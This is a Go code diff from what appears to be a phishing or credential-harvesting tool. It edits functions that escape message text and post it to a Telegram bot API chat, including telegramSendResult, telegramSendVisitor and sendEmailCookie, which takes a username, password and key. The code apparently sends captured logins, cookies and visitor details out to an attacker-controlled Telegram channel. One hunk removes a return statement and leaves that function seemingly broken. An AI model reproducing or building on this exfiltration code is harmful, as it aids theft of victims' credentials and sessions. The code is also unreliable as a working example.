@@ -42,7 +42,7 @@ func getUrl() string {
 	return fmt.Sprintf("https://api.telegram.org/bot%s", Token)
 }
 
-func getChatId string {
+func getChatId() string {
 	//get ChAT_ID from .env
 	ChatId := goDotEnvVariable("CHAT_ID")
 	return fmt.Sprintf("%s", ChatId)
@@ -50,7 +50,6 @@ func getChatId string {
 
 func telegramSendResult(msg string){
 	
-	var request *http.Response
 	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
 	// Send the message
 	url := fmt.Sprintf("%s/sendMessage", getUrl())
@@ -100,14 +99,11 @@ func sendEmailCookie(msg string, username string, password string, KeyUser strin
 		fmt.Printf("Unable to write file: %v", err)
 	}
 
-	return true, nil
 }
 
 func telegramSendVisitor(msg string) {
 	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
 	
-	// Send the message
-	var request *http.Response
 	url := fmt.Sprintf("%s/sendMessage", getUrl())
 	body, _ := json.Marshal(map[string]string{
 		"chat_id": getChatId(),
